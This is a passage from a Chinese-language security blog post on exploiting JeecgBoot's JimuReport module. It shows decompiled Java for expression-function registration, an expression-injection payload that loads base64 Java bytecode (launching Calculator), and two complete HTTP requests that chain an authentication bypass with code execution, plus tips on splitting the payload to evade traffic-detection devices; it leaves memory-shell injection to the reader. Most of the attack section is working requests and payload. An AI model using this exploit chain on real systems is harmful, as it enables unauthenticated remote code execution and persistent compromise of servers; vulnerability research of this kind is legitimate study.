UpperFormat();</span><br><span class="line">    g.addFunction(var25);</span><br><span class="line">    g.addFunction(var25.getName().toUpperCase(), var25);</span><br><span class="line">    CnMoneyFormat var26 = <span class="keyword">new</span> CnMoneyFormat();</span><br><span class="line">    g.addFunction(var26);</span><br><span class="line">    g.addFunction(var26.getName().toUpperCase(), var26);</span><br><span class="line">    NowStrFormat var27 = <span class="keyword">new</span> NowStrFormat();</span><br><span class="line">    g.addFunction(<span class="keyword">new</span> NowStrFormat());</span><br><span class="line">    g.addFunction(var27.getName().toUpperCase(), var27);</span><br><span class="line">    IsTimeFormat var28 = <span class="keyword">new</span> IsTimeFormat();</span><br><span class="line">    g.addFunction(<span class="keyword">new</span> IsTimeFormat());</span><br><span class="line">    g.addFunction(var28.getName().toUpperCase(), var28);</span><br><span class="line">    IsDateFormat var29 = <span class="keyword">new</span> IsDateFormat();</span><br><span class="line">    g.addFunction(<span class="keyword">new</span> IsDateFormat());</span><br><span class="line">    g.addFunction(var29.getName().toUpperCase(), var29);</span><br><span class="line">    IsNumberFormat var30 = <span class="keyword">new</span> IsNumberFormat();</span><br><span class="line">    g.addFunction(<span class="keyword">new</span> IsNumberFormat());</span><br><span class="line">    g.addFunction(var30.getName().toUpperCase(), var30);</span><br><span class="line">    IntValFormat var31 = <span class="keyword">new</span> IntValFormat();</span><br><span class="line">    g.addFunction(<span class="keyword">new</span> IntValFormat());</span><br><span class="line">    g.addFunction(var31.getName().toUpperCase(), var31);</span><br><span class="line">    StrValFormat var32 = <span class="keyword">new</span> StrValFormat();</span><br><span class="line">    g.addFunction(<span class="keyword">new</span> StrValFormat());</span><br><span class="line">    g.addFunction(var32.getName().toUpperCase(), var32);</span><br><span class="line">    DateStrFun var33 = <span class="keyword">new</span> DateStrFun();</span><br><span class="line">    g.addFunction(var33);</span><br><span class="line">    g.addFunction(var33.getName().toLowerCase(), var33);</span><br><span class="line">    g.addFunction(var33.getName().toUpperCase(), var33);</span><br><span class="line">    Date2Str var34 = <span class="keyword">new</span> Date2Str();</span><br><span class="line">    g.addFunction(var34);</span><br><span class="line">    g.addFunction(var34.getName().toLowerCase(), var34);</span><br><span class="line">    g.addFunction(var34.getName().toUpperCase(), var34);</span><br><span class="line">    g.addOpFunction(OperatorType.DIV, <span class="keyword">new</span> DivOperation());</span><br><span class="line">    g.addOpFunction(OperatorType.ADD, <span class="keyword">new</span> AddOperation());</span><br><span class="line">    g.addOpFunction(OperatorType.SUB, <span class="keyword">new</span> SubOperation());</span><br><span class="line">    g.addOpFunction(OperatorType.MULT, <span class="keyword">new</span> MultOperation());</span><br><span class="line">    DateStr var35 = <span class="keyword">new</span> DateStr();</span><br><span class="line">    g.addFunction(var35);</span><br><span class="line">    g.addFunction(var35.getName().toUpperCase(), var35);</span><br><span class="line">    VaildFormat var36 = <span class="keyword">new</span> VaildFormat();</span><br><span class="line">    g.addFunction(var36);</span><br><span class="line">    g.addFunction(var36.getName().toUpperCase(), var36);</span><br><span class="line">    CountNoZero var37 = <span class="keyword">new</span> CountNoZero();</span><br><span class="line">    g.addFunction(var37);</span><br><span class="line">    g.addFunction(var37.getName().toUpperCase(), var37);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        IJmExpressCustom var38 = (IJmExpressCustom)JimuSpringContextUtils.getBean(IJmExpressCustom.class);</span><br><span class="line">        <span class="keyword">if</span> (var38 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var38.addFunction(g);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var39) &#123;</span><br><span class="line">        h.debug(<span class="string">&quot;未发现自定义函数 IJmExpressCustom 实现类 ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    f = (List)g.getFuncMap().keySet().stream().filter(Objects::nonNull).filter((var0x) -&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> var0x.matches(<span class="string">&quot;[\\w.]+&quot;</span>);</span><br><span class="line">    &#125;).map(String::toString).collect(Collectors.toList());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然如此那么我们便找到了代码执行所在，秉持着能谷歌就不动手的理念，很快在github上搜到了想要的Payload</p><p><a target="_blank" rel="noopener" href="https://github.com/apache/hertzbeat/security/advisories/GHSA-mcqg-gqxr-hqgj">https://github.com/apache/hertzbeat/security/advisories/GHSA-mcqg-gqxr-hqgj</a></p><p>简单修改了一波，打算弹一个计算器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=(use org.springframework.util.ClassUtils;let loader = ClassUtils.getDefaultClassLoader();use org.springframework.util.Base64Utils;let str = Base64Utils.decodeFromString(&#x27;yv66vgAAADQANgoADAAbCQAcAB0IAB4KAB8AIAoAIQAiCAAjCgAhACQHACUHACYKAAkAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAITFlZRFNZNDsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAlAQAKU291cmNlRmlsZQEAC1lZRFNZNC5qYXZhDAANAA4HACoMACsALAEAAzEyMwcALQwALgAvBwAwDAAxADIBABNvcGVuIC1uYSBDYWxjdWxhdG9yDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAA0ANQEABllZRFNZNAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACwAMAAAAAAACAAEADQAOAAEADwAAAC8AAQABAAAABSq3AAGxAAAAAgAQAAAABgABAAAACQARAAAADAABAAAABQASABMAAAAIABQADgABAA8AAAByAAMAAQAAAB+yAAISA7YABLgABRIGtgAHV6cADUu7AAlZKrcACr+xAAEACAARABQACAADABAAAAAaAAYAAAALAAgADQARABAAFAAOABUADwAeABEAEQAAAAwAAQAVAAkAFQAWAAAAFwAAAAcAAlQHABgJAAEAGQAAAAIAGg==&#x27;);use org.springframework.cglib.core.ReflectUtils;ReflectUtils.defineClass(&#x27;YYDSY4&#x27;,str,loader);) </span><br></pre></td></tr></table></figure><p>成功触发，没毛病</p><p><img src="/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802215747451.png" alt="image-20240802215747451"></p><p>因此把这些步骤串起来</p><p>Step1:绕过鉴权保存表达式，记录response返回的id，在这里我把表达式中的Base64分离开，放在了其他单元格中，避免某些版本表达式部分长度太长报错，另外在某些低版本中，会对部分操作先将=替换为空再执行，因此可以结合这些点来绕过流量设备检测，但并不通用就是</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecg-boot/jmreport/save?previousPage=1&amp;jmLink=WTR8fHRlc3Q=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5946</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;designerObj&quot;</span>:&#123;<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;979228429299044352&quot;</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;20240802135128&quot;</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;ccc&quot;</span>,<span class="attr">&quot;note&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;status&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;datainfo&quot;</span>,<span class="attr">&quot;jsonStr&quot;</span>:<span class="string">&quot;&#123;\&quot;loopBlockList\&quot;:[],\&quot;printConfig\&quot;:&#123;\&quot;paper\&quot;:\&quot;A4\&quot;,\&quot;width\&quot;:210,\&quot;height\&quot;:297,\&quot;definition\&quot;:1,\&quot;isBackend\&quot;:false,\&quot;marginX\&quot;:10,\&quot;marginY\&quot;:10,\&quot;layout\&quot;:\&quot;portrait\&quot;,\&quot;printCallBackUrl\&quot;:\&quot;\&quot;&#125;,\&quot;hidden\&quot;:&#123;\&quot;rows\&quot;:[],\&quot;cols\&quot;:[]&#125;,\&quot;dbexps\&quot;:[],\&quot;dicts\&quot;:[],\&quot;freeze\&quot;:\&quot;A1\&quot;,\&quot;dataRectWidth\&quot;:200,\&quot;autofilter\&quot;:&#123;&#125;,\&quot;validations\&quot;:[],\&quot;cols\&quot;:&#123;\&quot;len\&quot;:50&#125;,\&quot;area\&quot;:&#123;\&quot;sri\&quot;:1,\&quot;sci\&quot;:1,\&quot;eri\&quot;:1,\&quot;eci\&quot;:1,\&quot;width\&quot;:100,\&quot;height\&quot;:25&#125;,\&quot;pyGroupEngine\&quot;:false,\&quot;hiddenCells\&quot;:[],\&quot;zonedEditionList\&quot;:[],\&quot;rows\&quot;:&#123;\&quot;0\&quot;:&#123;\&quot;cells\&quot;:&#123;\&quot;1\&quot;:&#123;\&quot;text\&quot;:\&quot;=(use org.springframework.util.ClassUtils;let loader = ClassUtils.getDefaultClassLoader();use org.springframework.util.Base64Utils;let str = Base64Utils.decodeFromString(A1);use org.springframework.cglib.core.ReflectUtils;ReflectUtils.defineClass(&#x27;YYDSY4&#x27;,str,loader);)\&quot;&#125;&#125;&#125;,\&quot;len\&quot;:100&#125;,\&quot;rpbar\&quot;:&#123;\&quot;show\&quot;:true,\&quot;pageSize\&quot;:\&quot;\&quot;,\&quot;btnList\&quot;:[]&#125;,\&quot;fixedPrintHeadRows\&quot;:[],\&quot;fixedPrintTailRows\&quot;:[],\&quot;displayConfig\&quot;:&#123;&#125;,\&quot;background\&quot;:false,\&quot;name\&quot;:\&quot;sheet1\&quot;,\&quot;styles\&quot;:[],\&quot;freezeLineColor\&quot;:\&quot;rgb(185, 185, 185)\&quot;,\&quot;merges\&quot;:[]&#125;&quot;</span>,<span class="attr">&quot;apiUrl&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;apiMethod&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;apiCode&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;thumb&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;template&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;createBy&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="attr">&quot;createTime&quot;</span>:<span class="string">&quot;2024-08-02 13:51:29&quot;</span>,<span class="attr">&quot;updateBy&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;updateTime&quot;</span>:<span class="string">&quot;2024-08-02 13:51:29&quot;</span>,<span class="attr">&quot;dataList&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;dictInfo&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;delFlag&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;viewCount&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;cssStr&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;jsStr&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;pyStr&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;tenantId&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;isRefresh&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;shareViewUrl&quot;</span>:<span class="literal">null</span>&#125;,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;sheet1&quot;</span>,<span class="attr">&quot;freeze&quot;</span>:<span class="string">&quot;A1&quot;</span>,<span class="attr">&quot;freezeLineColor&quot;</span>:<span class="string">&quot;rgb(185, 185, 185)&quot;</span>,<span class="attr">&quot;styles&quot;</span>:[],<span class="attr">&quot;displayConfig&quot;</span>:&#123;&#125;,<span class="attr">&quot;printConfig&quot;</span>:&#123;<span class="attr">&quot;paper&quot;</span>:<span class="string">&quot;A4&quot;</span>,<span class="attr">&quot;width&quot;</span>:<span class="number">210</span>,<span class="attr">&quot;height&quot;</span>:<span class="number">297</span>,<span class="attr">&quot;definition&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;isBackend&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;marginX&quot;</span>:<span class="number">10</span>,<span class="attr">&quot;marginY&quot;</span>:<span class="number">10</span>,<span class="attr">&quot;layout&quot;</span>:<span class="string">&quot;portrait&quot;</span>,<span class="attr">&quot;printCallBackUrl&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,<span class="attr">&quot;merges&quot;</span>:[],<span class="attr">&quot;rows&quot;</span>:&#123;<span class="attr">&quot;0&quot;</span>:&#123;<span class="attr">&quot;cells&quot;</span>:&#123;<span class="attr">&quot;0&quot;</span>:&#123;<span class="attr">&quot;text&quot;</span>:<span class="string">&quot;=concat(\&quot;yv66vgAAADQANgoADAAbCQAcAB0IAB4KAB8AIAoAIQAiCAAjCgAhACQHACUHACYKAAkAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAITFlZRFNZNDsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAlAQAKU291cmNlRmlsZQEAC1lZRFNZNC5qYXZhDAANAA4HACoMACsALAEAAzEyMwcALQwALgAvBwAwDAAxADIBABNvcGVuIC1uYSBDYWxjdWxhdG9yDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAA0ANQEABllZRFNZNAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACwAMAAAAAAACAAEADQAOAAEADwAAAC8AAQABAAAABSq3AAGxAAAAAgAQAAAABgABAAAACQARAAAADAABAAAABQASABMAAAAIABQADgABAA8AAAByAAMAAQAAAB+yAAISA7YABLgABRIGtgAHV6cADUu7AAlZKrcACr+xAAEACAARABQACAADABAAAAAaAAYAAAALAAgADQARABAAFAAOABUADwAeABEAEQAAAAwAAQAVAAkAFQAWAAAAFwAAAAcAAlQHABgJAAEAGQAAAAIAGg\&quot;,\&quot;==\&quot;) &quot;</span>&#125;,<span class="attr">&quot;1&quot;</span>:&#123;<span class="attr">&quot;text&quot;</span>:<span class="string">&quot;=(use org.springframework.util.ClassUtils;let loader = ClassUtils.getDefaultClassLoader();use org.springframework.util.Base64Utils;let str = Base64Utils.decodeFromString(A1);use org.springframework.cglib.core.ReflectUtils;ReflectUtils.defineClass(&#x27;YYDSY4&#x27;,str,loader);)&quot;</span>&#125;&#125;&#125;,<span class="attr">&quot;len&quot;</span>:<span class="number">100</span>&#125;,<span class="attr">&quot;cols&quot;</span>:&#123;<span class="attr">&quot;len&quot;</span>:<span class="number">50</span>&#125;,<span class="attr">&quot;validations&quot;</span>:[],<span class="attr">&quot;autofilter&quot;</span>:&#123;&#125;,<span class="attr">&quot;dbexps&quot;</span>:[],<span class="attr">&quot;dicts&quot;</span>:[],<span class="attr">&quot;loopBlockList&quot;</span>:[],<span class="attr">&quot;zonedEditionList&quot;</span>:[],<span class="attr">&quot;fixedPrintHeadRows&quot;</span>:[],<span class="attr">&quot;fixedPrintTailRows&quot;</span>:[],<span class="attr">&quot;rpbar&quot;</span>:&#123;<span class="attr">&quot;show&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;pageSize&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;btnList&quot;</span>:[]&#125;,<span class="attr">&quot;hiddenCells&quot;</span>:[],<span class="attr">&quot;hidden&quot;</span>:&#123;<span class="attr">&quot;rows&quot;</span>:[],<span class="attr">&quot;cols&quot;</span>:[]&#125;,<span class="attr">&quot;background&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;area&quot;</span>:&#123;<span class="attr">&quot;sri&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;sci&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;eri&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;eci&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;width&quot;</span>:<span class="number">100</span>,<span class="attr">&quot;height&quot;</span>:<span class="number">25</span>&#125;,<span class="attr">&quot;dataRectWidth&quot;</span>:<span class="number">200</span>,<span class="attr">&quot;excel_config_id&quot;</span>:<span class="string">&quot;979228429299044352&quot;</span>,<span class="attr">&quot;pyGroupEngine&quot;</span>:<span class="literal">false</span>&#125;</span></span><br></pre></td></tr></table></figure><p>Step2：</p><p>渲染执行表达式</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecg-boot/jmreport/show?previousPage=1&amp;jmLink=WTR8fHRlc3Q=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>253</span><br><span class="line"></span><br><span class="line"><span class="swift">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;938680635597357056&quot;</span>,<span class="string">&quot;apiUrl&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;params&quot;</span>:<span class="string">&quot;&#123;<span class="subst">\&quot;</span>pageNo<span class="subst">\&quot;</span>:1,<span class="subst">\&quot;</span>pageSize<span class="subst">\&quot;</span>:10,<span class="subst">\&quot;</span>jmViewFirstLoad<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>1<span class="subst">\&quot;</span>&#125;&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>至于最终注入内存马，就不用我教了吧</p></div></article><div class="blog-post-comments"><div id="utterances_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&text=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&title=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&is_video=false&description=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=JeecgBoot最新版权限绕过第二弹之内存马注入实录&body=Check out this article: https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&title=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&title=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&title=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&title=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&name=JeecgBoot最新版权限绕过第二弹之内存马注入实录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&t=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2025 Y4tacker</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul><ul><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 </span><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数<span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script type="text/javascript">$(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
